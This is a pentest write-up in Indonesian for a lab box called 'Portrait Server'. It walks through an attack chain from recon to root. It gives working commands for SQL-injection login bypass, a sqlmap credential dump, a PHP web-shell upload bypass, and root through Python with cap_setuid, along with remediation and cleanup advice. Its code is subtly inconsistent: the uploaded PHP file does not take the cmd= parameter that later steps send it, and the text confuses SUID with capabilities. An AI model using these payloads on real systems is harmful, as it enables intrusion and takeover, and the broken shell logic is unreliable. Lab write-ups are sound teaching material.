# Write-Up Privilege Escalation pada Portrait Server

> **Tujuan pembelajaran:** memahami alur pengujian keamanan dari tahap reconnaissance, memperoleh akses awal, mengunggah web shell, melakukan enumerasi sistem, hingga privilege escalation dari user `www-data` menjadi `root`.
>
> **Ruang lingkup:** write-up ini dibuat untuk lingkungan laboratorium yang telah memperoleh izin pengujian. Jangan menjalankan teknik berikut pada sistem yang tidak Anda miliki atau tidak memberikan izin tertulis.

---

## 1. Executive Summary

| Komponen | Informasi |
|---|---|
| Target | `192.168.56.118:8080` |
| Sistem Operasi | Ubuntu 22.04.5 LTS (Jammy Jellyfish) |
| Kernel | `5.15.0-178-generic` |
| Web Server | Apache HTTP Server |
| Database | MariaDB 10.6.23 |
| Akses Awal | `www-data` (`uid=33`) |
| Akses Akhir | `root` melalui `euid=0` |
| Tingkat Risiko | **Critical** |

### Kerentanan yang Ditemukan

1. **SQL Injection pada halaman login**
   - Penyerang dapat memanipulasi query autentikasi.
   - Kerentanan ini memungkinkan bypass login dan ekstraksi data database.

2. **Unrestricted File Upload / File Upload Bypass**
   - Validasi file hanya mengandalkan nama ekstensi atau MIME type dari klien.
   - File PHP dapat diunggah dengan teknik double extension dan kemudian dieksekusi oleh server.

3. **Linux Capability Misconfiguration pada Python**
   - Binary Python memiliki capability `cap_setuid=ep`.
   - Capability tersebut memungkinkan proses Python mengubah UID menjadi `0`.
   - User `www-data` dapat menjalankan payload Python dan memperoleh shell sebagai `root`.

### Rangkaian Serangan

```text
Reconnaissance
      ↓
Menemukan halaman /administrator dan /profile
      ↓
SQL Injection pada login
      ↓
Mendapatkan kredensial administrator
      ↓
Login dan mengakses fitur upload avatar
      ↓
Upload file PHP `cakgup.php`
      ↓
Remote Command Execution sebagai www-data
      ↓
Enumerasi Linux capabilities
      ↓
Menemukan Python dengan `cap_setuid=ep`
      ↓
Menjalankan payload Python `os.setuid(0)`
      ↓
Privilege Escalation menjadi root
```

---

## 2. Konsep Dasar untuk Pentester Pemula

### 2.1 Apa Itu Initial Access?

**Initial access** adalah akses pertama yang berhasil diperoleh pada target. Pada pengujian ini, akses awal diperoleh melalui web shell yang berjalan sebagai user Apache:

```text
uid=33(www-data)
```

User `www-data` biasanya digunakan oleh Apache atau Nginx. Hak aksesnya seharusnya terbatas agar kompromi aplikasi web tidak langsung memberikan kendali penuh atas server.

### 2.2 Apa Itu Privilege Escalation?

**Privilege escalation** adalah proses meningkatkan hak akses dari user dengan privilege rendah menjadi user dengan privilege lebih tinggi.

Pada write-up ini:

```text
www-data → root
```

### 2.3 Apa Perbedaan UID dan EUID?

- **UID** adalah identitas asli proses.
- **EUID** atau **effective user ID** adalah identitas yang digunakan sistem ketika memeriksa hak akses proses.

Contoh hasil eksploitasi:

```text
uid=33(www-data) gid=33(www-data) euid=0(root)
```

Walaupun UID masih `www-data`, proses memiliki EUID `0`, sehingga perintah berjalan dengan hak akses `root`.

### 2.4 Apa Itu Linux Capability?

Linux capability membagi privilege `root` menjadi hak yang lebih kecil dan spesifik. Salah satu capability sensitif adalah:

```text
cap_setuid
```

Capability tersebut mengizinkan proses mengubah user ID.

Pada target ditemukan Python dengan konfigurasi:

```text
/usr/bin/python3.13 cap_setuid=ep
```

Karena Python merupakan interpreter yang dapat menjalankan kode arbitrer, konfigurasi ini memungkinkan pemanggilan:

```python
os.setuid(0)
```

untuk mengubah UID proses menjadi `0`.

## 3. Phase 1 — Reconnaissance

Reconnaissance bertujuan mengidentifikasi service, port, teknologi, dan endpoint yang tersedia pada target.

---

### 3.1 Pemindaian Nmap

Jalankan:

```bash
nmap -Pn -sC -sV -O 192.168.56.118 -oA nmap-deep
```

### Penjelasan Opsi

| Opsi | Fungsi |
|---|---|
| `-Pn` | Menganggap target aktif tanpa melakukan host discovery terlebih dahulu |
| `-sC` | Menjalankan default NSE scripts |
| `-sV` | Mendeteksi versi service |
| `-O` | Mencoba mendeteksi sistem operasi |
| `-oA nmap-deep` | Menyimpan hasil dalam format normal, XML, dan grepable |

### Hasil Penting

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd
| http-server-header: Apache
| http-title: Portrait Studio — Timeless Photography

Running: Linux 4.x|5.x
OS details: Linux 4.15 - 5.19
```

### Interpretasi

Hasil tersebut menunjukkan:

- Aplikasi web berjalan pada port `8080`.
- Web server menggunakan Apache.
- Target kemungkinan menggunakan sistem operasi Linux.
- Halaman utama memiliki judul `Portrait Studio — Timeless Photography`.

Karena hanya port HTTP yang terlihat terbuka, pengujian selanjutnya difokuskan pada aplikasi web.

---

### 3.2 Directory Enumeration

Jalankan:

```bash
dirsearch \
  -u http://192.168.56.118:8080 \
  -e php,html,js
```

### Tujuan

Directory enumeration digunakan untuk menemukan:

- halaman yang tidak ditampilkan di menu utama;
- panel administrator;
- direktori upload;
- endpoint sensitif;
- file backup atau konfigurasi yang terekspos.

### Hasil Menarik

```text
301 /assets        -> /assets/
302 /dashboard     -> /administrator
302 /profile       -> /administrator
301 /uploads       -> /uploads/
```

### Penjelasan Status HTTP

| Status | Arti |
|---|---|
| `200` | Resource dapat diakses |
| `301` | Redirect permanen |
| `302` | Redirect sementara |
| `403` | Akses dilarang |
| `404` | Resource tidak ditemukan |

### Analisis

- `/administrator` diduga merupakan halaman login administrator.
- `/profile` kemungkinan merupakan halaman yang hanya dapat diakses setelah login.
- `/uploads` menjadi lokasi yang perlu diperiksa karena dapat menyimpan file dari pengguna.
- `/dashboard` mengarahkan pengguna ke halaman administrator.

---

## 4. Phase 2 — Initial Access melalui SQL Injection

### 4.1 Identifikasi Form Login

Endpoint yang diuji:

```text
http://192.168.56.118:8080/administrator
```

Form menerima dua parameter:

```text
username
password
```

Request normal kemungkinan menghasilkan query yang secara konseptual menyerupai:

```sql
SELECT *
FROM users
WHERE username = '<INPUT_USERNAME>'
  AND password = '<INPUT_PASSWORD>';
```

Jika input pengguna digabungkan langsung ke query tanpa prepared statement, attacker dapat mengubah logika SQL.

---

### 4.2 Pengujian Login Bypass

Contoh request:

```http
POST /administrator HTTP/1.1
Host: 192.168.56.118:8080
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1&password=' OR '1'='1
```

Payload:

```sql
' OR '1'='1
```

menghasilkan kondisi yang selalu benar karena:

```sql
'1'='1'
```

### Catatan Penting

Keberhasilan payload tidak hanya dinilai dari status HTTP `200`. Perhatikan juga:

- perubahan isi halaman;
- munculnya dashboard;
- cookie session baru;
- redirect ke halaman administrator;
- munculnya menu logout;
- perbedaan panjang response.

---

### 4.3 Validasi dengan SQLMap

> Gunakan SQLMap hanya pada sistem yang telah memberikan izin pengujian.

#### Menguji Parameter `username`

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  --level=2
```

### Penjelasan

| Opsi | Fungsi |
|---|---|
| `-u` | URL target |
| `--data` | Data POST yang dikirim |
| `-p username` | Hanya menguji parameter `username` |
| `--batch` | Menggunakan jawaban default tanpa interaksi |
| `--level=2` | Meningkatkan jumlah pengujian |

---

### 4.4 Mengidentifikasi Database

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  --banner \
  --current-user \
  --current-db
```

Hasil:

```text
banner: '10.6.23-MariaDB-0ubuntu0.22.04.1'
current user: 'portrait_app@localhost'
current database: 'portrait'
```

### Interpretasi

- Database menggunakan MariaDB.
- Aplikasi terhubung sebagai `portrait_app@localhost`.
- Database aktif bernama `portrait`.

---

### 4.5 Enumerasi Tabel

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  -D portrait \
  --tables
```

Hasil:

```text
+---------+
| content |
| users   |
+---------+
```

Tabel `users` menjadi target utama karena kemungkinan menyimpan akun administrator.

---

### 4.6 Ekstraksi Kredensial

```bash
sqlmap \
  -u 'http://192.168.56.118:8080/administrator' \
  --data='username=admin&password=test' \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

Hasil:

```text
username: admin
password: AdminPortr417126
```

### Dampak

SQL Injection memungkinkan attacker:

- melewati autentikasi;
- membaca struktur database;
- mengekstrak kredensial;
- mengakses fungsi yang hanya tersedia untuk administrator.

---

## 5. Phase 3 — File Upload Bypass

Setelah memperoleh akun administrator, attacker dapat mengakses halaman:

```text
/profile
```

Halaman tersebut menyediakan fungsi upload avatar.

---

### 5.1 Percobaan Awal

Upload file PHP dapat ditolak dengan pesan:

```text
Server only accepts JPG, PNG, GIF
```

Hal ini menunjukkan terdapat validasi file, tetapi validasinya masih perlu diuji karena aplikasi mungkin hanya memeriksa nama ekstensi atau MIME type dari klien.

---

### 5.2 Membuat Payload `cakgup.php`

Payload privilege escalation yang digunakan adalah:

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Karena file yang diunggah berekstensi `.php`, baris shell tersebut perlu dipanggil melalui PHP. Buat file `cakgup.php`:

```bash
cat > cakgup.php <<'PHP'
<?php
system("python -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'");
?>
PHP
```

Payload inti di dalam file tetap:

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

> Baris `python -c ...` tidak dapat dieksekusi sebagai PHP apabila ditulis tanpa tag PHP. Fungsi `system()` digunakan sebagai pembungkus agar command diproses oleh server.

---

### 5.3 Upload File

Contoh upload menggunakan session administrator:

```bash
curl -X POST \
  http://192.168.56.118:8080/profile \
  -F "avatar=@cakgup.php;filename=cakgup.php;type=image/jpeg" \
  -b "PHPSESSID=<SESSION_ID>"
```

Ganti `<SESSION_ID>` dengan session administrator yang valid.

Apabila aplikasi memeriksa ekstensi terakhir, nama sementara dapat diuji sebagai:

```text
cakgup.php.jpg
```

Namun, file yang dirujuk dan dieksekusi pada write-up ini adalah:

```text
/uploads/cakgup.php
```

---

### 5.4 Mengapa Upload Dapat Berhasil?

Kemungkinan aplikasi hanya memeriksa:

- ekstensi file;
- `Content-Type` dari request;
- nama file yang diberikan klien;
- string nama file tanpa memvalidasi isi sebenarnya.

MIME type dapat dimanipulasi oleh klien, sehingga tidak boleh digunakan sebagai satu-satunya validasi.

---

### 5.5 Mengakses Payload

Akses file:

```text
http://192.168.56.118:8080/uploads/cakgup.php
```

Ketika diproses oleh PHP, server menjalankan:

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Payload hanya akan berhasil memperoleh privilege `root` apabila binary Python memiliki capability `cap_setuid`.

## 6. Phase 4 — System Enumeration

Setelah memperoleh command execution, langkah berikutnya adalah memahami lingkungan target.

Definisikan URL web shell:

```bash
BASE_URL="http://192.168.56.118:8080/uploads/cakgup.php"
```

Karena perintah dikirim melalui URL, karakter khusus perlu diubah menjadi URL encoding.

Contoh:

```text
spasi → %20
/     → %2F, meskipun sering masih dapat dikirim langsung
>     → %3E
&     → %26
```

Gunakan `curl -G --data-urlencode` agar encoding lebih aman:

```bash
curl -sG \
  --data-urlencode "cmd=id" \
  "$BASE_URL"
```

---

### 6.1 Informasi User

```bash
curl -sG \
  --data-urlencode "cmd=id" \
  "$BASE_URL"
```

Hasil:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Perintah tambahan:

```bash
curl -sG \
  --data-urlencode "cmd=whoami" \
  "$BASE_URL"
```

Hasil:

```text
www-data
```

---

### 6.2 Informasi Sistem Operasi dan Kernel

```bash
curl -sG \
  --data-urlencode "cmd=uname -a" \
  "$BASE_URL"
```

Hasil:

```text
Linux portrait 5.15.0-178-generic #188-Ubuntu SMP
Sun Apr 12 07:19:49 UTC 2026 x86_64 GNU/Linux
```

Periksa versi OS:

```bash
curl -sG \
  --data-urlencode "cmd=cat /etc/os-release" \
  "$BASE_URL"
```

Hasil:

```text
PRETTY_NAME="Ubuntu 22.04.5 LTS"
VERSION_ID="22.04"
UBUNTU_CODENAME=jammy
```

### Mengapa Informasi Ini Penting?

Versi OS dan kernel membantu pentester:

- memahami mekanisme keamanan sistem;
- mencari misconfiguration yang relevan;
- menilai apakah sistem menggunakan paket yang sudah usang;
- menghindari percobaan exploit yang tidak sesuai versi.

Pada pengujian ini, privilege escalation tidak memerlukan exploit kernel karena terdapat kesalahan konfigurasi SUID.

---

### 6.3 Informasi Jaringan

```bash
curl -sG \
  --data-urlencode "cmd=ip address" \
  "$BASE_URL"
```

Alternatif:

```bash
curl -sG \
  --data-urlencode "cmd=ifconfig" \
  "$BASE_URL"
```

Hasil penting:

```text
enp0s3: inet 192.168.56.118/24
```

---

### 6.4 Lokasi Kerja dan Isi Direktori

```bash
curl -sG \
  --data-urlencode "cmd=pwd" \
  "$BASE_URL"
```

Hasil:

```text
/var/www/portrait/uploads
```

Periksa isi direktori:

```bash
curl -sG \
  --data-urlencode "cmd=ls -la" \
  "$BASE_URL"
```

Contoh hasil:

```text
-rw-r--r-- 1 www-data www-data 31 Jul 11 23:13 cakgup.php
-rw-r--r-- 1 www-data www-data 31 Jul 11 23:13 cakgup.inc
```

---

### 6.5 Pemeriksaan Linux Capabilities

Jalankan:

```bash
getcap -r / 2>/dev/null
```

Jika command dijalankan melalui web shell:

```bash
curl -sG \
  --data-urlencode "cmd=getcap -r / 2>/dev/null" \
  "$BASE_URL"
```

Hasil penting:

```text
/usr/bin/python3.13 cap_setuid=ep
```

### Penjelasan

| Bagian | Fungsi |
|---|---|
| `getcap -r /` | Memeriksa capability file secara rekursif |
| `2>/dev/null` | Menyembunyikan error permission denied |
| `cap_setuid=ep` | Capability SETUID aktif pada permitted dan effective set |

### Analisis

Temuan tersebut tidak normal untuk interpreter umum. Python dapat menjalankan kode arbitrer, termasuk:

```python
os.setuid(0)
```

Karena `cap_setuid` aktif, proses Python dapat mengubah UID menjadi `0`.

## 7. Phase 5 — Privilege Escalation melalui Python `cap_setuid`

### 7.1 Memastikan Capability Python

```bash
getcap /usr/bin/python3.13
```

Hasil:

```text
/usr/bin/python3.13 cap_setuid=ep
```

Periksa apakah command `python` mengarah ke binary tersebut:

```bash
command -v python
readlink -f "$(command -v python)"
```

---

### 7.2 Menjalankan Payload

Jalankan payload:

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Apabila target hanya menyediakan `python3.13`, jalankan binary yang memiliki capability:

```bash
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

### Cara Kerja

```python
import os
```

memuat modul sistem operasi.

```python
os.setuid(0)
```

mengubah UID proses menjadi `0`.

```python
os.execl("/bin/sh", "sh")
```

mengganti proses Python dengan `/bin/sh`.

---

### 7.3 Verifikasi Root

```bash
id
whoami
```

Hasil yang diharapkan:

```text
uid=0(root) gid=33(www-data) groups=33(www-data)
root
```

Indikator terpenting adalah `uid=0(root)` atau `euid=0(root)`.

---

### 7.4 Validasi Non-Destruktif

Gunakan:

```bash
id
whoami
hostname
```

Jangan mengubah password, SSH key, user, cron job, atau konfigurasi sistem kecuali diwajibkan oleh skenario laboratorium.

## 8. Mengapa `cap_setuid` pada Python Berbahaya?

Python merupakan interpreter serbaguna yang dapat menjalankan kode arbitrer.

Ketika Python memiliki:

```text
cap_setuid=ep
```

kode Python dapat meminta perubahan UID proses menjadi `0`.

```text
www-data
   ↓
Python dengan cap_setuid
   ↓
os.setuid(0)
   ↓
/bin/sh
   ↓
root
```

Capability sensitif tidak boleh diberikan kepada interpreter umum seperti Python, Perl, Ruby, atau shell.

## 9. Attack Path Lengkap

### Tahap 1 — Discovery

```text
Nmap menemukan Apache pada port 8080.
Directory enumeration menemukan /administrator, /profile, dan /uploads.
```

### Tahap 2 — Authentication Compromise

```text
Login form rentan terhadap SQL Injection.
SQLMap mengekstrak akun administrator dari database portrait.
```

### Tahap 3 — File Upload dan Execution

```text
Akun administrator membuka akses ke fitur upload.
File cakgup.php berhasil ditempatkan pada /uploads.
Apache/PHP memproses file tersebut sebagai script.
```

### Tahap 4 — Local Enumeration

```text
Akses awal berjalan sebagai www-data.
Perintah getcap menemukan Python dengan cap_setuid=ep.
```

### Tahap 5 — Root Privilege

```text
Payload Python memanggil os.setuid(0).
Python mengganti proses dengan /bin/sh.
Shell memperoleh UID atau EUID 0.
```

## 10. Root Cause Analysis

### 10.1 SQL Injection

Kemungkinan penyebab:

```php
$sql = "SELECT * FROM users
        WHERE username = '$username'
        AND password = '$password'";
```

Input pengguna digabungkan langsung ke query SQL.

#### Perbaikan

Gunakan prepared statement:

```php
$stmt = $pdo->prepare(
    'SELECT id, username, password_hash
     FROM users
     WHERE username = :username'
);

$stmt->execute([
    ':username' => $username
]);

$user = $stmt->fetch();
```

Password harus diverifikasi dengan:

```php
password_verify($password, $user['password_hash']);
```

Jangan menyimpan password dalam plaintext.

---

### 10.2 Unrestricted File Upload

Penyebab umum:

- hanya memeriksa ekstensi terakhir;
- mempercayai `Content-Type` dari klien;
- menyimpan file dengan nama asli;
- menyimpan file di web root;
- mengizinkan interpreter PHP pada direktori upload.

#### Perbaikan

1. Periksa isi file menggunakan server-side MIME detection.
2. Decode file sebagai gambar untuk memastikan format valid.
3. Buat ulang gambar menggunakan library seperti GD atau ImageMagick.
4. Gunakan nama file acak.
5. Simpan upload di luar document root.
6. Nonaktifkan eksekusi script pada direktori upload.
7. Terapkan batas ukuran file.
8. Gunakan allowlist format yang ketat.

Contoh konfigurasi Apache untuk mencegah eksekusi PHP di direktori upload:

```apache
<Directory "/var/www/portrait/uploads">
    Options -ExecCGI
    RemoveHandler .php .phtml .phar
    RemoveType .php .phtml .phar

    <FilesMatch "\.(php|phtml|phar|php[0-9]*)$">
        Require all denied
    </FilesMatch>
</Directory>
```

---

### 10.3 Linux Capability Misconfiguration

Penyebab privilege escalation adalah:

```text
/usr/bin/python3.13 cap_setuid=ep
```

Capability `cap_setuid` tidak seharusnya diberikan kepada interpreter umum.

#### Perbaikan Langsung

Hapus capability:

```bash
sudo setcap -r /usr/bin/python3.13
```

Verifikasi:

```bash
getcap /usr/bin/python3.13
```

Output seharusnya kosong.

Audit seluruh capability:

```bash
getcap -r / 2>/dev/null
```

## 11. Rekomendasi Keamanan

### Prioritas Kritis

1. Hapus capability `cap_setuid` dari binary Python.
2. Hapus seluruh web shell dan file upload berbahaya.
3. Perbaiki SQL Injection menggunakan prepared statement.
4. Reset password administrator dan session aktif.
5. Pindahkan direktori upload ke luar web root.
6. Nonaktifkan eksekusi PHP di direktori upload.

### Prioritas Tinggi

1. Simpan password menggunakan hashing yang kuat.
2. Terapkan least privilege pada user database.
3. Batasi permission user `www-data`.
4. Audit seluruh SUID dan SGID binary.
5. Tinjau log Apache, PHP, dan database untuk mencari aktivitas serupa.
6. Periksa apakah terdapat persistence seperti cron job, SSH key, atau user baru.

### Pemeriksaan Capability Berkala

```bash
getcap -r / 2>/dev/null
```

Simpan baseline hasil pemeriksaan dan bandingkan secara berkala.

---

## 12. Cleanup Setelah Pengujian

Dalam laboratorium, lakukan pembersihan agar target kembali ke kondisi semula.

### Menghapus Web Shell

```bash
rm -f /var/www/portrait/uploads/cakgup.php
rm -f /var/www/portrait/uploads/cakgup.php.jpg
rm -f /var/www/portrait/uploads/cakgup.phtml
rm -f /var/www/portrait/uploads/cakgup.phar
```

### Menghapus Capability yang Tidak Aman

```bash
setcap -r /usr/bin/python3.13
```

### Menghapus Session Lama

Logout dari aplikasi dan hapus cookie lokal:

```bash
rm -f login.cookies
```

### Verifikasi

```bash
find /var/www/portrait/uploads \
  -maxdepth 1 \
  -type f \
  \( -name '*.php' -o -name '*.phtml' -o -name '*.phar' \) \
  -ls
```

Pastikan tidak terdapat file executable yang tidak sah.

---

## 13. Troubleshooting untuk Pemula

### 13.1 Web Shell Hanya Menampilkan Source Code

Kemungkinan penyebab:

- ekstensi tersebut tidak diproses sebagai PHP;
- konfigurasi Apache tidak memetakan ekstensi ke PHP;
- PHP module atau PHP-FPM tidak aktif untuk lokasi tersebut.

Coba periksa ekstensi lain yang diizinkan oleh laboratorium atau periksa konfigurasi handler.

---

### 13.2 Mendapatkan `403 Forbidden`

Kemungkinan:

- Apache memblokir ekstensi tertentu;
- `.htaccess` atau konfigurasi virtual host melarang akses;
- permission file atau directory tidak cukup;
- ModSecurity atau WAF memblokir request.

---

### 13.3 Command dengan Spasi Tidak Berjalan

Gunakan URL encoding:

```bash
curl \
  "$BASE_URL?cmd=uname%20-a"
```

Cara yang lebih aman:

```bash
curl -sG \
  --data-urlencode "cmd=uname -a" \
  "$BASE_URL"
```

---

### 13.4 Payload Python Tidak Memberikan Root

Periksa capability:

```bash
getcap "$(command -v python)"
getcap /usr/bin/python3.13
```

Jika tidak muncul `cap_setuid=ep`, payload `os.setuid(0)` tidak memiliki privilege yang dibutuhkan.

Periksa lokasi binary:

```bash
readlink -f "$(command -v python)"
```

Gunakan binary yang benar-benar memiliki capability:

```bash
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

### 13.5 Perintah `getcap` Menghasilkan Banyak Error

Arahkan standard error ke `/dev/null`:

```bash
getcap -r / 2>/dev/null
```

---

## 14. Bukti Temuan

### Bukti 1 — SQL Injection

```text
Endpoint: POST /administrator
Parameter: username
Database: MariaDB 10.6.23
Database aktif: portrait
User database: portrait_app@localhost
```

### Bukti 2 — File Upload dan Execution

```text
URL: /uploads/cakgup.php
Payload:
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

### Bukti 3 — Capability Misconfiguration

```text
/usr/bin/python3.13 cap_setuid=ep
```

### Bukti 4 — Privilege Escalation

```text
uid=0(root)
root
```

## 15. Ringkasan Risiko

| Temuan | Dampak | Severity |
|---|---|---|
| SQL Injection | Bypass login dan ekstraksi database | Critical |
| Unrestricted File Upload | Remote Command Execution | Critical |
| Python `cap_setuid` Misconfiguration | Local Privilege Escalation menjadi root | Critical |

Ketiga kerentanan membentuk attack chain yang memungkinkan attacker berpindah dari akses web tanpa privilege menjadi kendali penuh atas sistem operasi.

---

## 16. Pelajaran Utama

1. Status HTTP `200` tidak selalu berarti login berhasil; bandingkan isi response dan session.
2. Validasi upload harus memeriksa isi file, bukan hanya nama dan MIME type.
3. Direktori upload tidak boleh mengeksekusi script.
4. User web server harus memiliki privilege minimum.
5. Capability sensitif pada interpreter umum merupakan risiko sangat tinggi.
6. Misconfiguration sederhana dapat lebih mudah dieksploitasi daripada kerentanan kernel.
7. Selalu lakukan cleanup setelah pengujian.
8. Catat command, output, waktu, dan bukti agar hasil pengujian dapat direproduksi.

---

## 17. Checklist Pengujian

### Reconnaissance

- [x] Scan port dan service dengan Nmap
- [x] Enumerasi direktori web
- [x] Identifikasi halaman administrator
- [x] Identifikasi direktori upload

### Initial Access

- [x] Uji login terhadap SQL Injection
- [x] Verifikasi dengan SQLMap
- [x] Enumerasi database dan tabel
- [x] Ekstrak kredensial administrator

### File Upload

- [x] Uji upload file PHP
- [x] Uji double extension
- [x] Identifikasi ekstensi yang diproses sebagai PHP
- [x] Verifikasi command execution

### Privilege Escalation

- [x] Identifikasi user saat ini
- [x] Identifikasi OS dan kernel
- [x] Enumerasi Linux capabilities
- [x] Analisis Python dengan `cap_setuid=ep`
- [x] Jalankan payload `os.setuid(0)`
- [x] Verifikasi `uid=0(root)` atau `euid=0(root)`

### Cleanup

- [ ] Hapus web shell
- [ ] Hapus capability tidak sah
- [ ] Reset kredensial
- [ ] Invalidasi session
- [ ] Audit log dan persistence

---

## 18. Kesimpulan

Portrait Server memiliki rangkaian kerentanan kritis yang saling berhubungan.

SQL Injection pada halaman login memungkinkan attacker memperoleh akses administrator. Akses tersebut membuka fitur upload yang validasinya dapat dilewati, sehingga file `cakgup.php` dapat ditempatkan pada direktori `/uploads` dan diproses oleh PHP.

Payload yang digunakan adalah:

```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Privilege escalation berhasil karena binary Python memiliki capability:

```text
cap_setuid=ep
```

Capability tersebut memungkinkan proses Python menjalankan `os.setuid(0)` dan mengganti proses dengan `/bin/sh`, sehingga shell memperoleh UID atau EUID `0`.

Akar permasalahan adalah kombinasi:

- SQL Injection;
- validasi upload yang lemah;
- eksekusi PHP pada direktori upload;
- capability `cap_setuid` pada interpreter Python.

Prepared statement, validasi file berbasis isi, penyimpanan upload di luar web root, penonaktifan eksekusi script pada direktori upload, dan audit capability secara berkala dapat memutus attack chain tersebut.
